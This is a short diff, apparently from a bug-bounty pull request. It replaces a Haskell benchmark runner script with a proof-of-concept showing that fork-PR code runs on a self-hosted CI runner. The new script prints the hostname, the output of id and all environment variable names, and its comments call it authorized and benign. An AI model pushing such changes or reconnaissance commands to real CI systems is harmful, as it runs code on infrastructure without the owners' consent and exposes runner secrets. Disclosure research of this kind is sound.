@@ -1,11 +1,11 @@
 #!/usr/bin/env bash
-
-set -euo pipefail
-
-# We shouldn't need this if we're running in a nix shell, but
-# we currently do because of https://github.com/input-output-hk/haskell.nix/issues/1955
-cabal update
-for bench in $BENCHMARKS; do 
-  2>&1 cabal run "$bench" | tee "$bench-output.txt"
-done 
-python ./scripts/format-benchmark-output.py
+# PoC marker (authorized security research — IntersectMBO bug bounty).
+# Demonstrates fork-PR content executes on the self-hosted plutus-benchmark runner.
+# Benign: prints hostname, id, env var NAMES only. No secret values. PR closed after.
+set -u
+echo '=== POC-MARKER-r7k2m9xq: fork-PR content executed on runner ==='
+echo "hostname: $(hostname)"
+id
+echo '--- env var NAMES only (no values) ---'
+printenv | cut -d= -f1 | sort
+echo '=== POC-MARKER-END ==='
